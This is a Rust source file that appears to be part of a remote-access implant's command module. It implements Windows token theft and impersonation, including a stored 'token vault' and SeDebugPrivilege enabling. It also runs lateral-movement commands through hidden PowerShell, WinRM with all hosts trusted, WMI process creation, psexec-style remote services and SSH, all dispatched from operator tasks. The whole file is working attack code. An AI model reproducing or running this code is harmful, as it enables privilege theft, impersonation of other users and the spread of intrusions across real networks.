#![allow(dead_code, non_snake_case, unused_imports)]
// Token vault + lateral movement commands for the Rust agent.

use std::process::Command;
use std::sync::{Mutex, OnceLock};

use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, LUID};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser,
    LookupAccountSidW, LookupPrivilegeValueW, SecurityImpersonation, TokenElevation,
    TokenImpersonation, TokenUser, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES,
    TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_ELEVATION, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows_sys::Win32::System::Memory::{GetProcessHeap, HeapAlloc, HeapFree};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
};

use crate::transport::{AgentTransport, TaskWire};

// ── Basic helpers (verbatim from commands.rs) ─────────────────────────────────

fn shell(cmd: &str) -> String {
    super::shell(cmd)
}

fn ps(script: &str) -> String {
    match Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

// ── Token store ───────────────────────────────────────────────────────────────

struct StoredToken {
    index:    usize,
    handle:   isize,   // duplicated HANDLE, kept open until removed
    pid:      u32,
    username: String,
    domain:   String,
    elevated: bool,
}

// HANDLE is just an integer; safe to move between threads inside a Mutex.
unsafe impl Send for StoredToken {}

static TOKEN_STORE: OnceLock<Mutex<Vec<StoredToken>>> = OnceLock::new();

fn token_store() -> std::sync::MutexGuard<'static, Vec<StoredToken>> {
    TOKEN_STORE.get_or_init(|| Mutex::new(Vec::new())).lock().unwrap()
}

// ── Win32 helpers ─────────────────────────────────────────────────────────────

/// Resolve the username/domain from a token handle via GetTokenInformation + LookupAccountSidW.
unsafe fn get_token_user(htok: isize) -> (String, String) {
    // First call: get required buffer size.
    let mut sz = 0u32;
    GetTokenInformation(htok, TokenUser, std::ptr::null_mut(), 0, &mut sz);
    if sz == 0 {
        return ("unknown".into(), "".into());
    }

    let heap = GetProcessHeap();
    let buf = HeapAlloc(heap, 0, sz as usize) as *mut u8;
    if buf.is_null() {
        return ("unknown".into(), "".into());
    }

    GetTokenInformation(htok, TokenUser, buf as *mut core::ffi::c_void, sz, &mut sz);

    // TOKEN_USER = { SID_AND_ATTRIBUTES { Sid: PSID (*mut c_void), Attributes: u32 } }
    // The PSID pointer occupies the first pointer-width bytes of the buffer.
    let sid: *mut core::ffi::c_void = *(buf as *const *mut core::ffi::c_void);

    let mut name_buf = vec![0u16; 256];
    let mut dom_buf  = vec![0u16; 256];
    let mut name_len = 256u32;
    let mut dom_len  = 256u32;
    let mut sid_type = 0i32;

    LookupAccountSidW(
        std::ptr::null(),
        sid,
        name_buf.as_mut_ptr(),
        &mut name_len,
        dom_buf.as_mut_ptr(),
        &mut dom_len,
        &mut sid_type,
    );

    HeapFree(heap, 0, buf as *mut core::ffi::c_void as *const core::ffi::c_void);

    let name = String::from_utf16_lossy(&name_buf[..name_len as usize]);
    let dom  = String::from_utf16_lossy(&dom_buf[..dom_len as usize]);
    (name, dom)
}

/// Enable SeDebugPrivilege on the current process token.
unsafe fn enable_sedebug() {
    let mut hself = 0isize;
    if OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &mut hself,
    ) != 0
    {
        let name = wide("SeDebugPrivilege");
        let mut luid: LUID = std::mem::zeroed();
        LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid);
        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
        };
        AdjustTokenPrivileges(
            hself, 0, &tp,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
        CloseHandle(hself);
    }
}

/// Steal a token from `pid`, duplicate it, store in the vault, and return a status string.
/// Does NOT impersonate — call `use_token` afterwards if desired.
unsafe fn steal_and_store(pid: u32, label: Option<&str>) -> String {
    enable_sedebug();

    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
    if hproc == 0 {
        return format!("OpenProcess failed (err {})", GetLastError());
    }
    let mut htok = 0isize;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);

    let mut hdup = 0isize;
    DuplicateTokenEx(
        htok,
        TOKEN_ALL_ACCESS,
        std::ptr::null(),
        SecurityImpersonation,
        TokenImpersonation,
        &mut hdup,
    );
    CloseHandle(htok);
    if hdup == 0 {
        return format!("DuplicateTokenEx failed (err {})", GetLastError());
    }

    let (username, domain) = get_token_user(hdup);

    let mut elev = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut esz = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
    GetTokenInformation(
        hdup,
        TokenElevation,
        &mut elev as *mut TOKEN_ELEVATION as *mut core::ffi::c_void,
        esz,
        &mut esz,
    );
    let elevated = elev.TokenIsElevated != 0;

    let mut store = token_store();
    let idx = store.len();
    let _display = label.unwrap_or(&username).to_string();
    store.push(StoredToken {
        index: idx,
        handle: hdup,
        pid,
        username: username.clone(),
        domain: domain.clone(),
        elevated,
    });

    format!(
        "[+] token #{}: {}\\{} (PID={}, elevated={})",
        idx, domain, username, pid, elevated
    )
}

/// Steal token from `pid`, store in vault, AND immediately impersonate it.
unsafe fn steal_and_store_impersonate(pid: u32) -> String {
    let store_result = steal_and_store(pid, None);
    if !store_result.starts_with("[+]") {
        return store_result;
    }
    // Extract handle and user info while holding the lock, then drop the lock.
    let (h, user) = {
        let store = token_store();
        match store.last() {
            Some(tok) => (tok.handle, format!("{}\\{}", tok.domain, tok.username)),
            None => return store_result,
        }
    };
    if ImpersonateLoggedOnUser(h) != 0 {
        format!("{}\n[+] impersonating {}", store_result, user)
    } else {
        format!("{}\n[-] impersonate failed (err {})", store_result, GetLastError())
    }
}

// ── Token vault operations ────────────────────────────────────────────────────

fn show_tokens() -> String {
    let store = token_store();
    if store.is_empty() {
        return "[*] no tokens in store".to_string();
    }
    store
        .iter()
        .map(|t| {
            format!(
                "  #{}: {}\\{} (PID={}, elevated={})",
                t.index, t.domain, t.username, t.pid, t.elevated
            )
        })
        .collect::<Vec<_>>()
        .join("\n")
}

unsafe fn use_token(idx: usize) -> String {
    // Copy the handle and format the user string before dropping the lock.
    let (h, user) = {
        let store = token_store();
        match store.iter().find(|t| t.index == idx) {
            Some(tok) => (tok.handle, format!("{}\\{}", tok.domain, tok.username)),
            None => return format!("token #{} not found", idx),
        }
    };
    if ImpersonateLoggedOnUser(h) != 0 {
        format!("[+] impersonating #{} {}", idx, user)
    } else {
        format!("ImpersonateLoggedOnUser failed (err {})", GetLastError())
    }
}

fn remove_token(idx: usize) -> String {
    let mut store = token_store();
    match store.iter().position(|t| t.index == idx) {
        Some(pos) => {
            let tok = store.remove(pos);
            unsafe { CloseHandle(tok.handle); }
            format!("[+] token #{} removed", idx)
        }
        None => format!("token #{} not found", idx),
    }
}

fn clear_tokens() -> String {
    let mut store = token_store();
    let count = store.len();
    for tok in store.drain(..) {
        unsafe { CloseHandle(tok.handle); }
    }
    format!("[+] cleared {} tokens", count)
}

// ── Lateral movement helpers ──────────────────────────────────────────────────

fn ssh_exec(host: &str, user: &str, pass: &str, cmd: &str, port: u16) -> String {
    let script = format!(
        "$pw=ConvertTo-SecureString '{}' -AsPlainText -Force;\
         $cred=New-Object PSCredential('{}', $pw);\
         Invoke-Command -HostName {} -Port {} -UserName {} -ScriptBlock {{{}}} 2>&1",
        pass, user, host, port, user, cmd
    );
    ps(&script)
}

fn winrm_exec(host: &str, user: &str, pass: &str, cmd: &str) -> String {
    let script = format!(
        "$ep=$ErrorActionPreference;$ErrorActionPreference='SilentlyContinue';\
         Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force;\
         $ErrorActionPreference=$ep;\
         try{{$ip=([System.Net.Dns]::GetHostAddresses('{}')|\
         Where-Object{{$_.AddressFamily -ne 23}}|Select-Object -First 1).IPAddressToString}}catch{{$ip='{}'}};\
         $pw=ConvertTo-SecureString '{}' -AsPlainText -Force;\
         $cred=New-Object PSCredential('{}', $pw);\
         Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $cred \
         -ScriptBlock {{try{{{}|Out-String -Width 256}}catch{{$_.Exception.Message}}}} 2>&1",
        host, host, pass, user, cmd
    );
    ps(&script)
}

fn lateral_move(host: &str, user: &str, pass: &str, cmd: &str, method: &str) -> String {
    match method {
        "wmi" => {
            let script = format!(
                "$pw=ConvertTo-SecureString '{}' -AsPlainText -Force;\
                 $cred=New-Object PSCredential('{}', $pw);\
                 Invoke-WmiMethod -ComputerName {} -Credential $cred \
                 -Class Win32_Process -Name Create -ArgumentList '{}' 2>&1",
                pass, user, host, cmd
            );
            ps(&script)
        }
        "psexec" => shell(&format!(
            "net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>&1 && \
             sc \\\\{} create tmpsvc binpath= \"{}\" start= auto && \
             sc \\\\{} start tmpsvc",
            host, pass, user, host, cmd, host
        )),
        _ => format!("unknown lateral method: {}", method),
    }
}

fn net_use(share: &str, user: &str, pass: &str) -> String {
    shell(&format!(
        "net use \"{}\" \"{}\" /user:\"{}\" 2>&1",
        share, pass, user
    ))
}

// ── Dispatch ──────────────────────────────────────────────────────────────────

/// Try to handle `task`; returns `true` if handled, `false` if the task type
/// is unknown (allowing the caller to fall through to other dispatchers).
pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        // ── Token vault: steal ────────────────────────────────────────────────
        "TOKEN_STORE_STEAL" | "TOKEN_STORE_STORE" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let pid = j.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            let label = j.get("label").and_then(|v| v.as_str()).map(str::to_owned);
            if pid == 0 {
                t.send_result(
                    task.id, "",
                    "TOKEN_STORE_STEAL requires {\"pid\":N}",
                );
                return true;
            }
            let r = unsafe { steal_and_store(pid, label.as_deref()) };
            t.send_result(task.id, &r, "");
            true
        }

        // ── Token vault: list ─────────────────────────────────────────────────
        "TOKEN_STORE_SHOW" => {
            t.send_result(task.id, &show_tokens(), "");
            true
        }

        // ── Token vault: impersonate ──────────────────────────────────────────
        "TOKEN_STORE_USE" | "TOKEN_STORE_IMPERSONATE" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let idx = j
                .get("index")
                .and_then(|v| v.as_u64())
                .or_else(|| task.args.trim().parse::<u64>().ok())
                .unwrap_or(0) as usize;
            let r = unsafe { use_token(idx) };
            t.send_result(task.id, &r, "");
            true
        }

        // ── Token vault: remove one ───────────────────────────────────────────
        "TOKEN_STORE_REMOVE" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let idx = j
                .get("index")
                .and_then(|v| v.as_u64())
                .or_else(|| task.args.trim().parse::<u64>().ok())
                .unwrap_or(0) as usize;
            t.send_result(task.id, &remove_token(idx), "");
            true
        }

        // ── Token vault: clear all ────────────────────────────────────────────
        "TOKEN_STORE_CLEAR" => {
            t.send_result(task.id, &clear_tokens(), "");
            true
        }

        // ── Steal + store + impersonate (replaces TOKEN_STEAL with vault save) ─
        "STEAL_TOKEN" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let pid = j.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            if pid == 0 {
                t.send_result(task.id, "", "STEAL_TOKEN requires {\"pid\":N}");
                return true;
            }
            let r = unsafe { steal_and_store_impersonate(pid) };
            t.send_result(task.id, &r, "");
            true
        }

        // ── Lateral: SSH via PowerShell OpenSSH ───────────────────────────────
        "SSH_EXEC" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let host = j.get("host").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let user = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let pass = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let cmd  = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(22) as u16;
            t.send_result(task.id, &ssh_exec(&host, &user, &pass, &cmd, port), "");
            true
        }

        // ── Lateral: WinRM via PowerShell Invoke-Command ──────────────────────
        "WINRM_EXEC" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let host = j.get("host").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let user = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let pass = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let cmd  = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            t.send_result(task.id, &winrm_exec(&host, &user, &pass, &cmd), "");
            true
        }

        // ── Lateral movement (WMI / psexec) ──────────────────────────────────
        "LATERAL" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let host   = j.get("host").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let user   = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let pass   = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let cmd    = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let method = j.get("method").and_then(|v| v.as_str()).unwrap_or("wmi").to_owned();
            t.send_result(
                task.id,
                &lateral_move(&host, &user, &pass, &cmd, &method),
                "",
            );
            true
        }

        // ── Network share: connect ────────────────────────────────────────────
        "NET_USE" => {
            let j: serde_json::Value =
                serde_json::from_str(&task.args).unwrap_or_default();
            let share = j.get("share").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let user  = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            let pass  = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_owned();
            t.send_result(task.id, &net_use(&share, &user, &pass), "");
            true
        }

        // ── Network share: disconnect ─────────────────────────────────────────
        "NET_USE_DEL" => {
            let share = task.args.trim().to_owned();
            t.send_result(
                task.id,
                &shell(&format!("net use \"{}\" /delete /yes 2>&1", share)),
                "",
            );
            true
        }

        _ => false,
    }
}
